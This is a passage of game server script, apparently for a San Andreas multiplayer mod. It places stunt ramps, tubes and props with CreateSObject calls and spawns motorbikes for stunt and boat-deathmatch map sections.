	CreateSObject(18779, -1423.77002, 40.51000, 22.45000,   0.00000, 0.00000, 137.77000);
	CreateSObject(18780, -1385.81006, 64.71000, 24.51000,   0.00000, 0.00000, 314.29001);
	CreateSObject(18780, -1357.98999, 36.09000, 87.74000,   0.00000, -60.90000, 314.06000);
	CreateSObject(18847, -1247.44995, 180.63000, 31.21000,   13.00000, 39.00000, 221.00000);
	CreateSObject(18779, -1197.13000, 281.45001, 95.01000,   0.00000, 28.00000, 231.00000);
	CreateSObject(4550, -1539.59998, -36.44000, 13.10000,   0.00000, -44.00000, -11.00000);
	CreateSObject(10757, -1316.88000, -9.03000, 67.60000,   10.00000, -8.00000, 353.00000);
	CreateSObject(19901, -1134.85547, -240.10199, 17.79258,   0.00000, 0.00000, 335.89301);
	CreateSObject(19901, -1089.44177, -260.41623, 17.79258,   0.00000, 0.00000, 335.89301);
	CreateSObject(18840, -1051.72668, -289.61499, 17.53000,   91.00000, 98.00000, 98.00000);
	CreateSObject(19901, -1068.60352, -333.68115, 17.58550,   0.00000, 0.00000, 234.98700);
	CreateSObject(18840, -1102.73877, -367.45285, 17.32590,   91.00000, 98.00000, 3.82920);
	CreateSObject(18784, -1114.35803, -367.36185, 13.64680,   0.00000, 0.00000, 156.00000);
	CreateSObject(18830, -1620.06165, -318.73517, 16.57330,   180.00000, -23.00000, 61.75296);
	CreateSObject(18830, -1630.00000, -313.37543, 16.57330,   180.00000, -23.00000, 61.75296);
	CreateSObject(18830, -1626.98633, -331.99329, 31.82190,   180.00000, -69.00000, 62.00000);
	CreateSObject(18830, -1637.02783, -326.62094, 31.82190,   180.00000, -69.00000, 62.00000);
	CreateSObject(19076, -1258.19397, -177.61226, 12.80559,   0.00000, 0.00000, 0.00000);
	CreateSObject(19076, -1292.44177, -147.38574, 12.80559,   0.00000, 0.00000, 0.00000);
	CreateSObject(19076, -1299.57910, -155.25342, 12.80559,   0.00000, 0.00000, 0.00000);
	CreateSObject(19076, -1305.73450, -162.03764, 12.80559,   0.00000, 0.00000, 0.00000);
	CreateSObject(19076, -1313.33203, -169.68492, 12.80559,   0.00000, 0.00000, 0.00000);
	CreateSObject(19076, -1265.61890, -184.14912, 12.80559,   0.00000, 0.00000, 0.00000);
	CreateSObject(19076, -1273.17090, -191.09023, 12.80559,   0.00000, 0.00000, 0.00000);
	CreateSObject(19076, -1281.47290, -196.90121, 12.80559,   0.00000, 0.00000, 0.00000);
	CreateSObject(6965, -1411.57178, -66.04511, 16.79740,   0.00000, 0.00000, 0.00000);
	CreateSObject(19336, -1538.61523, -238.54567, 54.82606,   0.00000, 0.00000, 1.84304);
	CreateSObject(19335, -1564.38538, -236.29251, 64.76527,   0.00000, 0.00000, 0.00000);
	CreateSObject(19338, -1538.22632, -253.31714, 71.82946,   0.00000, 0.00000, 0.00000);
	CreateSObject(18782, -1287.38245, -26.00010, 14.37607,   0.00000, 0.00000, 0.00000);
	CreateSObject(18819, -1592.06165, -215.19957, 37.74855,   90.00000, -47.00000, 268.75241);
	CreateSObject(18823, -1557.38110, -181.86810, 20.92650,   0.00000, -67.00000, 47.00000);
	CreateSObject(18809, -1558.67969, -252.05127, 37.68480,   0.00000, 90.00000, 312.45300);
	CreateSObject(18809, -1525.09814, -288.76270, 37.68480,   0.00000, 90.00000, 312.45300);
	CreateSObject(18809, -1491.35205, -325.55032, 37.68480,   0.00000, 90.00000, 312.45300);
	CreateSObject(18826, -1461.72766, -345.54950, 51.43070,   32.00000, 2.00000, -229.00000);
	CreateSObject(18826, -1460.09106, -313.31387, 64.88060,   -91.02000, -149.00000, 170.63811);
	CreateSObject(18809, -1423.02112, -323.80386, 65.49240,   0.00000, -91.00000, -40.00000);
	CreateSObject(18809, -1384.81189, -355.87411, 66.35990,   0.00000, -91.00000, -40.00000);
	CreateSObject(18809, -1346.71167, -387.85699, 67.21810,   0.00000, -91.00000, -40.00000);
	CreateSObject(18809, -1310.67896, -418.32529, 74.70360,   0.00000, -107.00000, 319.57330);
	CreateSObject(18812, -1279.51099, -452.57660, 44.46494,   0.00000, 0.00000, 0.00000);
	CreateSObject(18827, -1641.48828, -159.13324, 37.74040,   0.00000, 0.00000, 41.21890);
	CreateSObject(18827, -1707.17432, -84.14983, 37.74040,   0.00000, 0.00000, 41.21890);
	CreateSObject(18999, -1467.36841, -579.89441, 28.04083,   0.00000, -84.00000, 2.00000);
	CreateSObject(18829, -1628.87817, -247.39090, 37.75980,   0.00000, -90.00000, 220.60330);
	CreateSObject(18832, -1653.07983, -269.04849, 29.78850,   0.00000, 0.00000, 45.46580);
	CreateSObject(18836, -1600.11414, -503.07431, 19.57350,   0.00000, 0.00000, 45.37023);
	CreateSObject(18836, -1637.73474, -466.41284, 19.57350,   0.00000, 0.00000, 45.37023);
	CreateSObject(18836, -1673.47668, -430.50702, 15.69145,   -6.00000, 0.00000, 45.00000);
	CreateSObject(18836, -1582.19470, -520.77618, 19.57350,   0.00000, 0.00000, 45.37023);
	CreateSObject(18836, -1549.05859, -554.38135, 17.01461,   6.00000, 0.00000, 45.00000);
	CreateSObject(18781, -1479.65686, -92.30100, 23.44395,   0.00000, 0.00000, 110.68290);
	CreateSObject(18781, -1271.88232, -565.25031, 23.91640,   0.00000, 0.00000, 136.20760);
	CreateSObject(18781, -1270.46411, -600.94727, 23.91640,   0.00000, 0.00000, 48.39534);
	CreateSObject(18781, -1306.15247, -602.05573, 24.17739,   0.00000, 0.00000, 315.59167);
	CreateSObject(18781, -1307.63843, -566.44513, 23.91640,   0.00000, 0.00000, 227.85555);
	CreateSObject(1225, -1288.71106, -585.68439, 13.14381,   0.00000, 0.00000, 0.00000);
	CreateSObject(1225, -1290.61523, -583.86871, 13.14381,   0.00000, 0.00000, 0.00000);
	CreateSObject(1225, -1289.13794, -582.35944, 13.14381,   0.00000, 0.00000, 0.00000);
	CreateSObject(1225, -1287.39807, -583.86676, 13.14381,   0.00000, 0.00000, 0.00000);
	CreateSObject(19076, -1289.73950, -589.47314, 21.66575,   0.00000, 0.00000, 0.00000);
	CreateSObject(19076, -1292.46240, -586.70209, 21.66575,   0.00000, 0.00000, 0.00000);
	CreateSObject(19076, -1293.30652, -583.67670, 21.66575,   0.00000, 0.00000, 0.00000);
	CreateSObject(19076, -1290.68872, -580.98419, 21.66575,   0.00000, 0.00000, 0.00000);
	CreateSObject(19076, -1289.22595, -585.02539, 21.66575,   0.00000, 0.00000, 0.00000);
	CreateSObject(19076, -1286.28101, -587.20422, 21.66575,   0.00000, 0.00000, 0.00000);
	CreateSObject(19076, -1283.86377, -584.63232, 21.66575,   0.00000, 0.00000, 0.00000);
	CreateSObject(19076, -1285.83057, -581.34106, 21.66575,   0.00000, 0.00000, 0.00000);
	CreateSObject(19076, -1288.16785, -578.85651, 21.66575,   0.00000, 0.00000, 0.00000);
	CreateSObject(19076, -1288.16785, -578.85651, 21.66575,   0.00000, 0.00000, 0.00000);
	CreateSObject(18786, -1197.21521, -411.78241, 15.54170,   0.00000, 0.00000, 52.70860);
	CreateSObject(18786, -1206.31604, -423.77124, 22.46450,   0.00000, 20.00000, 53.00000);
	CreateSObject(19002, -1220.08643, -438.89810, 32.10230,   0.00000, 0.00000, 328.56934);
	CreateSObject(18779, -1577.01294, -126.51880, 16.55068,   0.00000, 0.00000, 45.58786);
	CreateSObject(18783, -1601.40112, -142.66280, 24.14260,   0.00000, 0.00000, 313.97229);
	CreateSObject(18783, -1615.42126, -156.24527, 24.14260,   0.00000, 0.00000, 313.97229);
	CreateSObject(18783, -1629.44092, -169.82994, 24.14260,   0.00000, 0.00000, 313.97229);
	CreateSObject(18783, -1643.89465, -183.69284, 24.14260,   0.00000, 0.00000, 313.97229);
	CreateSObject(18783, -1658.26038, -197.50719, 24.14260,   0.00000, 0.00000, 313.97229);
	CreateSObject(18783, -1601.94800, -170.55637, 24.14260,   0.00000, 0.00000, 313.97229);
	CreateSObject(18783, -1616.10034, -184.42798, 24.14260,   0.00000, 0.00000, 313.97229);
	CreateSObject(18783, -1630.50769, -198.36482, 24.14260,   0.00000, 0.00000, 313.97229);
	CreateSObject(18783, -1644.48120, -211.91348, 24.14260,   0.00000, 0.00000, 313.97229);
	CreateSObject(18783, -1672.21106, -183.07263, 24.14260,   0.00000, 0.00000, 313.97229);
	CreateSObject(18783, -1685.97302, -168.63535, 24.14260,   0.00000, 0.00000, 313.97229);
	CreateSObject(18787, -1695.62720, -158.40565, 28.82942,   0.00000, 0.00000, 41.44846);
	CreateSObject(18783, -1587.60034, -156.74638, 24.14260,   0.00000, 0.00000, 313.97229);
	CreateSObject(18779, -1562.45532, -140.82124, 16.55068,   0.00000, 0.00000, 45.58786);
	CreateSObject(18783, -1673.26086, -210.60353, 24.14260,   0.00000, 0.00000, 313.97229);
	CreateSObject(18783, -1687.63025, -224.42361, 24.14260,   0.00000, 0.00000, 313.97229);
	CreateSObject(18783, -1701.94629, -238.17279, 24.14260,   0.00000, 0.00000, 313.97229);
	CreateSObject(18780, -1721.12085, -263.53134, 36.88283,   0.00000, 0.00000, 223.88103);
	CreateSObject(18780, -1727.79712, -256.40131, 36.88283,   0.00000, 0.00000, 223.88103);
	CreateSObject(18786, -1649.58289, -216.59967, 28.80514,   0.00000, 0.00000, 42.56667);
	CreateSObject(18786, -1659.44678, -225.50909, 35.00129,   0.00000, 18.00000, 43.00000);
	CreateSObject(18783, -1673.07141, -238.09853, 37.93810,   0.00000, 0.00000, 313.97229);
	CreateSObject(18783, -1687.46350, -251.98470, 37.93810,   0.00000, 0.00000, 313.97229);
	CreateSObject(18830, -1703.02979, -272.67654, 44.64234,   0.00000, 156.00000, 223.76854);
	CreateSObject(18830, -1708.67810, -266.73087, 44.64234,   0.00000, 156.00000, 223.76854);
	CreateSObject(6965, -1345.16406, -183.94904, 16.79740,   0.00000, 0.00000, 0.00000);
	CreateSObject(6965, -1299.11609, -231.69823, 16.79740,   0.00000, 0.00000, 0.00000);
	CreateSObject(4206, -1299.66541, -231.80022, 13.17860,   0.00000, 0.00000, 0.00000);
	CreateSObject(4206, -1345.31506, -183.84311, 13.17860,   0.00000, 0.00000, 0.00000);
	CreateSObject(6964, -1299.52112, -231.60060, 12.36280,   0.00000, 0.00000, 0.00000);
	CreateSObject(6964, -1345.19543, -183.64914, 12.36280,   0.00000, 0.00000, 0.00000);
	CreateSObject(6964, -1411.52649, -66.09208, 12.36280,   0.00000, 0.00000, 0.00000);
	CreateSObject(19057, -1306.94861, -278.65268, 13.75490,   0.00000, 0.00000, 0.00000);
	CreateSObject(19058, -1302.54639, -272.57010, 13.75450,   0.00000, 0.00000, 0.00000);
	CreateSObject(19055, -1312.65710, -277.46213, 13.80360,   0.00000, 0.00000, 0.00000);
	CreateSObject(19054, -1318.92017, -276.26074, 13.77770,   0.00000, 0.00000, 0.00000);
	CreateSObject(19056, -1309.98535, -271.58945, 13.82490,   0.00000, 0.00000, 0.00000);
	CreateSObject(19054, -1296.25952, -270.02798, 13.77770,   0.00000, 0.00000, 0.00000);
	CreateSObject(19054, -1335.30103, -283.86200, 13.77770,   0.00000, 0.00000, 0.00000);
	CreateSObject(19055, -1289.87988, -268.76285, 13.80360,   0.00000, 0.00000, 0.00000);
	CreateSObject(19055, -1276.87769, -261.21176, 13.80360,   0.00000, 0.00000, 0.00000);
	CreateSObject(19055, -1330.03223, -283.58029, 13.80360,   0.00000, 0.00000, 0.00000);
	CreateSObject(19056, -1292.12622, -271.60992, 13.82490,   0.00000, 0.00000, 0.00000);
	CreateSObject(19056, -1275.05627, -264.42322, 13.82490,   0.00000, 0.00000, 0.00000);
	CreateSObject(19056, -1339.30139, -288.65952, 13.82490,   0.00000, 0.00000, 0.00000);
	CreateSObject(19058, -1322.81995, -278.58228, 13.75450,   0.00000, 0.00000, 0.00000);
	CreateSObject(19058, -1322.79395, -278.57141, 13.75450,   0.00000, 0.00000, 0.00000);
	CreateSObject(19058, -1284.05566, -265.29306, 13.75450,   0.00000, 0.00000, 0.00000);
	CreateSObject(19057, -1269.56897, -261.62021, 13.75490,   0.00000, 0.00000, 0.00000);
	CreateSObject(19057, -1332.51111, -288.99252, 13.75490,   0.00000, 0.00000, 0.00000);
	CreateSObject(19054, -1390.90332, -202.04343, 13.77770,   0.00000, 0.00000, 0.00000);
	CreateSObject(19058, -1396.64624, -214.59340, 13.75450,   0.00000, 0.00000, 0.00000);
	CreateSObject(19056, -1397.24890, -220.44157, 13.82490,   0.00000, 0.00000, 0.00000);
	CreateSObject(19055, -1401.41516, -217.61848, 13.80360,   0.00000, 0.00000, 0.00000);
	CreateSObject(19057, -1385.79541, -187.03217, 13.75490,   0.00000, 0.00000, 0.00000);
	CreateSObject(19055, -1399.18945, -205.24368, 13.80360,   0.00000, 0.00000, 0.00000);
	CreateSObject(19055, -1391.85840, -191.07866, 13.80360,   0.00000, 0.00000, 0.00000);
	CreateSObject(19055, -1379.38574, -161.42500, 13.80360,   0.00000, 0.00000, 0.00000);
	CreateSObject(19057, -1388.26196, -177.43959, 13.75490,   0.00000, 0.00000, 0.00000);
	CreateSObject(19057, -1393.39563, -208.58768, 13.75490,   0.00000, 0.00000, 0.00000);
	CreateSObject(19058, -1393.88196, -198.88216, 13.75450,   0.00000, 0.00000, 0.00000);
	CreateSObject(19058, -1386.38855, -181.58147, 13.75450,   0.00000, 0.00000, 0.00000);
	CreateSObject(19058, -1385.27905, -167.17667, 13.75450,   0.00000, 0.00000, 0.00000);
	CreateSObject(19056, -1400.00610, -207.30019, 13.82490,   0.00000, 0.00000, 0.00000);
	CreateSObject(19056, -1381.88513, -171.64885, 13.82490,   0.00000, 0.00000, 0.00000);
	CreateSObject(19056, -1383.06677, -154.81490, 13.82490,   0.00000, 0.00000, 0.00000);
	CreateSObject(19054, -1391.05762, -186.57037, 13.77770,   0.00000, 0.00000, 0.00000);
	CreateSObject(19054, -1378.39001, -155.66667, 13.77770,   0.00000, 0.00000, 0.00000);
	CreateSObject(19054, -1402.33606, -222.68906, 13.77770,   0.00000, 0.00000, 0.00000);
	CreateSObject(18771, -1246.93018, -275.91940, 10.73199,   0.00000, 0.00000, 0.00000);
	CreateSObject(18771, -1386.79541, -128.06503, 10.73199,   0.00000, 0.00000, 0.00000);
	CreateVehicleEx(522, -1362.6246, -244.6826, 13.6408, 320.0760, -1, -1, 100);
	CreateVehicleEx(522, -1366.3303, -240.9442, 13.6408, 320.0760, -1, -1, 100);
	CreateVehicleEx(522, -1370.0321, -237.2335, 13.6408, 320.0760, -1, -1, 100);
	CreateVehicleEx(522, -1372.9812, -234.1817, 13.6408, 320.0760, -1, -1, 100);
	CreateVehicleEx(522, -1376.4536, -230.9290, 13.6408, 320.0000, -1, -1, 100);
	CreateVehicleEx(522, -1358.7095, -248.5368, 13.6408, 320.0000, -1, -1, 100);
	CreateVehicleEx(522, -1355.3961, -251.8729, 13.6408, 320.0000, -1, -1, 100);
	CreateVehicleEx(522, -1351.8656, -255.5587, 13.6408, 320.0000, -1, -1, 100);
	CreateVehicleEx(522, -1348.1659, -259.1281, 13.6408, 320.0000, -1, -1, 100);
	// Stunts2
	CreateSObject(8171, -798.46002, 1942.06995, 4.37000,   0.00000, 0.00000, 10.55000);
	CreateSObject(8171, -759.22998, 1949.72998, 4.37000,   0.00000, 0.00000, 10.55000);
	CreateSObject(8171, -720.12000, 1957.14001, 4.37000,   0.00000, 0.00000, 10.55000);
	CreateSObject(8171, -680.82001, 1964.55005, 4.37000,   0.00000, 0.00000, 10.55000);
	CreateSObject(8171, -641.53998, 1972.01001, 4.37000,   0.00000, 0.00000, 10.55000);
	CreateSObject(8171, -602.21997, 1979.23999, 4.37000,   0.00000, 0.00000, 10.55000);
	CreateSObject(8171, -734.96997, 1863.64001, 4.37000,   0.00000, 0.00000, 100.70000);
	CreateSObject(8171, -599.06000, 1889.28003, 4.37000,   0.00000, 0.00000, 100.70000);
	CreateSObject(8171, -748.14001, 1820.54004, 4.37000,   0.00000, 0.00000, 100.70000);
	CreateSObject(8171, -612.38000, 1846.17004, 4.37000,   0.00000, 0.00000, 100.70000);
	CreateSObject(8171, -674.33002, 1793.77002, 4.37000,   0.00000, 0.00000, 100.70000);
	CreateSObject(8171, -810.10999, 1768.30005, 4.37000,   0.00000, 0.00000, 100.70000);
	CreateSObject(18859, -647.28003, 1751.87000, 15.68000,   0.00000, 0.00000, 191.16000);
	CreateSObject(18859, -695.09998, 1742.31995, 15.68000,   0.00000, 0.00000, 190.45000);
	CreateSObject(18859, -742.79999, 1733.53003, 15.68000,   0.00000, 0.00000, 190.34000);
	CreateSObject(18859, -790.71997, 1724.92004, 15.68000,   0.00000, 0.00000, 190.55000);
	CreateSObject(18859, -599.57001, 1761.76001, 15.68000,   0.00000, 0.00000, 191.36000);
	CreateSObject(18779, -648.69000, 1935.09998, 13.95000,   0.00000, 0.00000, 30.32000);
	CreateSObject(18779, -666.39001, 1901.75000, 13.95000,   0.00000, 0.00000, 299.88000);
	CreateSObject(18779, -699.58002, 1919.44995, 13.95000,   0.00000, 0.00000, 209.83000);
	CreateSObject(18779, -682.17999, 1952.56006, 13.95000,   0.00000, 0.00000, 120.88000);
	CreateSObject(18826, -796.07001, 1860.63000, 23.63000,   0.00000, 0.00000, 8.24000);
	CreateSObject(18826, -775.13000, 1863.68005, 55.53000,   0.00000, 0.00000, 187.88000);
	CreateSObject(18824, -803.57001, 1847.70996, 70.94000,   91.00000, -4.00000, 326.29999);
	CreateSObject(18826, -811.71002, 1816.00000, 86.47000,   0.00000, 0.00000, 96.65000);
	CreateSObject(18809, -816.09998, 1851.19995, 102.77000,   91.00000, 0.00000, 7.54000);
	CreateSObject(18809, -779.54999, 1955.70996, 104.96000,   91.00000, 0.00000, 96.40000);
	CreateSObject(18818, -827.90997, 1942.28003, 104.90000,   -87.00000, 0.00000, 6.56000);
	CreateSObject(18826, -863.75000, 1945.72998, 121.16000,   0.00000, 0.00000, 8.24000);
	CreateSObject(18809, -822.57001, 1900.59998, 103.59000,   91.00000, 0.00000, 7.54000);
	CreateSObject(18826, -744.29999, 1959.98999, 120.48000,   0.00000, 0.00000, 187.67999);
	CreateSObject(18826, -762.96002, 1941.54004, 138.06000,   84.00000, 0.00000, 7.83000);
	CreateSObject(18826, -737.89001, 1912.96997, 138.06000,   84.00000, 0.00000, 187.37000);
	CreateSObject(18809, -771.04999, 1892.66003, 136.81000,   91.00000, 0.00000, 97.41000);
	CreateSObject(18809, -828.59003, 1950.73999, 136.48000,   91.00000, 0.00000, 97.41000);
	CreateSObject(18826, -806.14001, 1888.32996, 153.14999,   0.00000, 0.00000, 5.89000);
	CreateSObject(18809, -771.03003, 1892.67004, 168.63000,   91.00000, 0.00000, 97.41000);
	CreateSObject(18826, -795.58002, 1971.09998, 137.56000,   84.00000, 0.00000, 188.39000);
	CreateSObject(18826, -816.83002, 1969.93005, 146.63000,   62.00000, 0.00000, 7.49000);
	CreateSObject(18822, -780.48999, 1953.04004, 154.49001,   91.00000, 0.00000, 253.61000);
	CreateSObject(18809, -721.60999, 1899.08997, 167.75999,   91.00000, 0.00000, 97.41000);
	CreateSObject(18826, -749.75000, 1937.07996, 170.86000,   0.00000, 0.00000, 140.75000);
	CreateSObject(18826, -756.15997, 1962.68994, 187.10001,   91.00000, 0.00000, 321.44000);
	CreateSObject(18843, -648.91998, 1908.16003, 168.14000,   91.00000, 0.00000, 277.00000);
	CreateSObject(18826, -730.01001, 1961.80005, 203.08000,   0.00000, 0.00000, 140.84000);
	CreateSObject(18826, -590.62000, 1930.57996, 170.63000,   84.00000, 0.00000, 183.38000);
	CreateSObject(18826, -613.25000, 1961.21997, 170.63000,   84.00000, 0.00000, 2.34000);
	CreateSObject(18826, -736.34998, 1987.47998, 219.25000,   91.00000, 0.00000, 321.06000);
	CreateSObject(18809, -698.42999, 1978.33997, 219.07001,   91.00000, 0.00000, 52.99000);
	CreateSObject(18826, -670.20001, 1957.03003, 202.67999,   0.00000, 0.00000, 142.92999);
	CreateSObject(18826, -687.15002, 1969.62000, 170.84000,   0.00000, 0.00000, 323.16000);
	CreateSObject(18826, -660.70001, 1969.35999, 156.57001,   84.00000, 0.00000, 142.61000);
	CreateSObject(18826, -593.56000, 1993.73999, 170.59000,   84.00000, 0.00000, 182.61000);
	CreateSObject(18809, -629.73999, 2008.25000, 172.59000,   91.00000, 0.00000, 91.68000);
	CreateSObject(18824, -682.42999, 1990.54004, 158.20000,   90.00000, 0.00000, 278.00000);
	CreateSObject(18826, -719.22998, 1981.53003, 169.48000,   135.00000, 0.00000, 49.31000);
	CreateSObject(18824, -717.23999, 2019.76001, 180.77000,   90.00000, 0.00000, 184.14000);
	CreateSObject(18826, -665.64001, 2022.94995, 171.37000,   84.00000, 0.00000, 1.88000);
	CreateSObject(18826, -645.65002, 2055.17993, 171.37000,   84.00000, 0.00000, 181.77000);
	CreateSObject(18809, -681.53998, 2069.54004, 173.49001,   91.00000, 0.00000, 92.64000);
	CreateSObject(18826, -716.33002, 2054.88989, 183.21001,   55.00000, 0.00000, 2.50000);
	CreateSObject(18826, -694.90002, 2042.66003, 208.17999,   0.00000, 0.00000, 181.82001);
	CreateSObject(18826, -737.77002, 2042.93994, 194.06000,   33.00000, 0.00000, 314.98001);
	CreateSObject(18826, -722.90002, 2028.06006, 220.71001,   33.00000, 0.00000, 134.69000);
	CreateSObject(18826, -715.97998, 2050.22998, 210.59000,   33.00000, 0.00000, 2.63000);
	CreateSObject(18824, -729.78998, 2063.22998, 237.13000,   98.00000, 4.00000, 357.70001);
	CreateSObject(18824, -688.14001, 2068.12988, 208.59000,   33.00000, -40.00000, 184.05000);
	CreateSObject(18824, -692.39001, 2091.26001, 240.08000,   33.00000, 55.00000, 172.00999);
	CreateSObject(18802, -715.71997, 2095.62988, 239.96001,   0.00000, -11.00000, 22.96000);
	CreateSObject(18802, -721.85999, 2089.28003, 236.48000,   -11.00000, -4.00000, 53.00000);
	CreateSObject(18801, -700.22998, 1872.05005, 27.19000,   0.00000, 0.00000, 332.32999);
	CreateSObject(18801, -707.27002, 1853.33997, 27.17000,   0.00000, 0.00000, 332.32999);
	CreateSObject(18801, -714.26001, 1834.65002, 27.17000,   0.00000, 0.00000, 332.32999);
	CreateSObject(18779, -708.13000, 1825.56006, 11.89000,   0.00000, 0.00000, 144.92999);
	CreateSObject(18780, -767.19000, 1963.09998, 13.17000,   0.00000, 0.00000, 9.60000);
	CreateSObject(18780, -795.19000, 1958.30005, 13.17000,   0.00000, 0.00000, 189.98000);
	CreateSObject(18750, -764.38000, 1719.56006, 46.55000,   91.00000, 0.00000, 190.03999);
	CreateSObject(18750, -656.54999, 1739.58997, 46.55000,   91.00000, 0.00000, 191.02000);
	CreateSObject(18784, -757.97998, 1916.32996, 6.63000,   0.00000, 0.00000, 282.07001);
	CreateSObject(18784, -753.79999, 1896.79004, 6.63000,   0.00000, 0.00000, 102.23000);
	CreateSObject(7392, -819.22998, 1895.51001, 18.72000,   0.00000, 0.00000, 10.47000);
	CreateSObject(7392, -823.47998, 1922.12000, 18.92000,   0.00000, 0.00000, 191.95000);
	CreateSObject(18800, -668.77002, 1994.85999, 12.06000,   0.00000, 0.00000, 53.31000);
	CreateSObject(18778, -670.50000, 1954.29004, 25.80000,   0.00000, 0.00000, 143.22000);
	CreateSObject(18808, -622.70001, 1923.26001, 8.44000,   89.00000, 0.00000, 344.45001);
	CreateSObject(18838, -808.72998, 1979.63000, 16.13000,   0.00000, 0.00000, 10.38000);
	CreateSObject(18838, -793.28003, 1982.05005, 32.02000,   0.00000, 0.00000, 187.98000);
	CreateSObject(18838, -808.90002, 1980.00000, 79.63000,   0.00000, 0.00000, 7.49000);
	CreateSObject(18842, -776.28998, 1984.23999, 56.27000,   91.00000, 0.00000, 277.26999);
	CreateSObject(18838, -743.88000, 1988.50000, 64.63000,   0.00000, 0.00000, 187.98000);
	CreateSObject(18842, -776.40002, 1984.25000, 72.17000,   91.00000, 0.00000, 277.26999);
	CreateSObject(18838, -808.90002, 1980.00000, 47.92000,   0.00000, 0.00000, 7.49000);
	CreateSObject(18842, -776.40002, 1984.25000, 88.07000,   91.00000, 0.00000, 277.26999);
	CreateSObject(18836, -677.46997, 1996.64001, 88.64000,   0.00000, 280.00000, 97.00000);
	CreateSObject(18836, -726.84998, 1990.59998, 88.64000,   0.00000, 76.00000, 97.00000);
	CreateSObject(18838, -644.97998, 2000.73999, 96.53000,   0.00000, 0.00000, 187.98000);
	CreateSObject(18840, -676.03998, 2004.65002, 109.43000,   -62.00000, -42.00000, 10.71000);
	CreateSObject(18840, -681.39001, 2045.40002, 125.34000,   244.00000, -98.00000, 226.67999);
	CreateSObject(18838, -651.65002, 2060.94995, 127.81000,   0.00000, -18.00000, 193.00999);
	CreateSObject(18842, -679.02002, 2055.32007, 146.70000,   69.00000, 4.00000, 277.00000);
	CreateSObject(18842, -724.71997, 2046.22998, 164.61000,   69.00000, 4.00000, 277.00000);
	CreateSObject(18842, -770.45001, 2037.15002, 182.47000,   69.00000, 4.00000, 276.89999);
	CreateSObject(18847, -886.58002, 2017.07996, 234.53000,   0.00000, 20.00000, 10.27000);
	CreateSObject(18779, -1001.08002, 1982.05005, 263.92999,   0.00000, 18.00000, 9.65000);
	CreateSObject(18779, -1003.88000, 1998.31006, 263.92999,   0.00000, 18.00000, 9.65000);
	CreateSObject(18777, -773.51001, 1798.79004, 6.88000,   0.00000, 0.00000, 96.17000);
	CreateSObject(18777, -773.51001, 1798.79004, 32.89000,   0.00000, 0.00000, 96.17000);
	CreateSObject(18777, -773.51001, 1798.79004, 58.87000,   0.00000, 0.00000, 96.17000);
	CreateSObject(18777, -773.51001, 1798.79004, 79.69000,   0.00000, 0.00000, 96.17000);
	CreateSObject(18777, -773.51001, 1798.79004, 105.69000,   0.00000, 0.00000, 96.17000);
	CreateSObject(18772, -876.45001, 1809.93005, 200.07001,   -34.00000, 0.00000, 274.95999);
	CreateSObject(18779, -972.21002, 1795.72998, 275.85999,   -1.00000, 33.00000, 4.00000);
	CreateSObject(3528, -600.96002, 1937.65002, 23.04000,   0.00000, 0.00000, 164.49001);
	CreateSObject(3528, -604.15002, 1923.80005, 23.04000,   0.00000, 0.00000, 164.49001);
	CreateSObject(3528, -607.27002, 1910.87000, 23.04000,   0.00000, 0.00000, 164.49001);
	CreateSObject(3374, -736.66998, 2032.82996, 24.30000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -736.66998, 2032.82996, 27.00000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -736.66998, 2032.82996, 30.00000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -736.66998, 2032.82996, 32.80000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -736.66998, 2032.82996, 35.70000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -733.04999, 2032.98999, 35.68000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -733.04999, 2032.98999, 24.60000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -729.53003, 2032.71997, 27.38000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -729.53003, 2032.71997, 33.30000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -727.51001, 2032.81006, 30.26000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -721.59003, 2033.09998, 24.11000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -721.59003, 2033.09998, 27.00000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -721.59003, 2033.09998, 29.96000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -721.59003, 2033.09998, 32.74000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -721.59003, 2033.09998, 35.83000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -719.17999, 2033.17004, 35.83000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -714.09003, 2033.64001, 30.40000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -708.91998, 2034.10999, 35.61000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -706.14001, 2034.35999, 35.61000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -706.14001, 2034.35999, 32.44000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -706.14001, 2034.35999, 29.54000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -706.14001, 2034.35999, 26.55000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -706.14001, 2034.35999, 23.53000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -716.59003, 2033.41003, 33.28000,   0.00000, 0.00000, 0.00000);
	CreateSObject(3374, -711.06000, 2033.80005, 33.28000,   0.00000, 0.00000, 0.00000);
	// BoatsDM
	CreateSObject(8148, -881.81946, -2905.81641, 3.14151,   0.00000, 0.00000, 165.83760,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1249.90002, -2628.00000, 9.50000,   0.00000, 0.00000, 0.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1234.59998, -2599.30005, 6.50000,   0.00000, 0.00000, 314.00000,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1229.14575, -2597.64404, 1.30000,   334.00000, 0.00000, 301.99500,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1246.69727, -2573.31982, 1.30000,   358.05499, 14.00800, 50.47700,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1261.69995, -2582.10010, 17.10000,   358.04999, 14.00800, 50.47700,object_show_distance,0,worlds_dmz + dmz_boats);
	CreateSObject(17031, -1244.00000, -2637.19995, 5.10000,   351.99500, 0.00000, 67.99200,object_show_distance,0,worlds_dmz + dmz_boats);
